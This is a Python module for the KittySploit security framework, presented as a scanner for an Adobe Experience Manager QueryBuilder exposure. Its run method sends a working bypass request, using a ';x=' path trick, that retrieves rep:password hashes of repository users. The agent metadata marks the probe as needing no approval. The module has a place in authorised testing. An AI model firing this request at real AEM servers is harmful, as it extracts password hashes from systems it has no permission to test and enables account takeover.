#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Adobe Experience Manager QueryBuilder endpoint allows unauthenticated attackers to extract sensitive user repo."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'AEM QueryBuilder JSON Exposure - Bypass Detection',
        'description': 'Adobe Experience Manager QueryBuilder endpoint allows unauthenticated attackers to extract sensitive user repository data, including password hashes from the rep:password field in /home/users. This vulnerability bypasses access controls and exposes bcrypt/SHA-256 password hashes through the querybuilder.json API, enabling potential credential compromise and account takeover attacks.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'aem', 'adobe', 'exposure', 'querybuilder'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://experienceleague.adobe.com/docs/experience-manager-65/developing/platform/query-builder/querybuilder-api.html',
            'https://slcyber.io/assetnote-security-research-center/finding-critical-bugs-in-adobe-experience-manager/',
            'https://github.com/assetnote/hopgoblin',
        ],
    }

    def run(self):
        path = "/bin/querybuilder.json;x='x/graphql/execute/json/x'?path=%2Fhome%2Fusers&type=rep%3AUser&p.hits=selective&p.properties=rep%3Apassword&p.limit=3"
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('"rep:password"', '"success":true', '"results":', '"hits":',)
        if all(m in body for m in body_all):
            self.set_info(severity='critical', reason='AEM QueryBuilder JSON Exposure - Bypass detected', path=path)
            return True
        return False

